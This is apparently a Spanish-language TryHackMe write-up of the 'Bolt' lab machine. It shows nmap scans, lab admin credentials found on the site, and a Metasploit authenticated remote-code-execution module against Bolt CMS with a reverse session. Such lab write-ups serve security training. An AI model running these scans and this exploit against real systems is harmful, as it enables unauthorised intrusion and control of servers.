---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - Linux
  - HTTP
  - Bolt
  - CMS
  - MSF
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
- [[#Explotación|Explotación]]
	- [[#Explotación#MSFconsole|MSFconsole]]

---
# Resolviendo la máquina Bolt

>En esta publicación, comparto cómo resolví la máquina **Bolt** de [TryHackMe](https://tryhackme.com/room/bolt).

---
## Enumeración
### Ping

Ejecutamos un *ping* para comprobar la conectividad y obtener pistas sobre el sistema operativo.

`ping -c 1 10.10.210.91`

![[Pasted image 20250724112359.png]]

*TTL=63* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.210.91 -oG allPorts`

![[Pasted image 20250724112447.png]]

`nmap -p22,80,8000 -sCV 10.10.210.91 -oN targeted`

![[Pasted image 20250724112504.png]]
![[Pasted image 20250724112529.png]]
![[Pasted image 20250724112548.png]]
### HTTP

`http://10.10.158.108:8000/`

![[Pasted image 20250724112638.png]]
![[Pasted image 20250724112657.png]]

Se encuentra el usuario(`bolt`) y la contraseña (`boltadmin123`).

Se realiza una búsqueda para ver donde se encuentra el directorio de inicio de sesión del **Bolt CMS**, se encuentra en la ruta: `http://10.10.158.108:8000/bolt`.

![[Pasted image 20250724113716.png]]

![[Pasted image 20250724113744.png]]

---
## Explotación
### MSFconsole

Se realiza una búsqueda en *MSFconsole*. Se encuentra el exploit (`exploit/unix/webapp/bolt_authenticated_rce`) que permite ejecutar **RCE (Remote Code Execution)**.

```
search Bolt CMS
use 0 | use exploit/unix/webapp/bolt_authenticated_rce
show options
set RHOSTS 10.10.210.91
set LHOST 10.8.184.124
set USERNAME bolt
set PASSWORD boltadmin123
check
exploit
```

![[Pasted image 20250724113447.png]]
![[Pasted image 20250724113500.png]]

`background`

`sessions -u 1`

`sessions 2`

Se accede al directorio: `/home`.

`cd /home`

`ls`

![[Pasted image 20250724113624.png]]

---
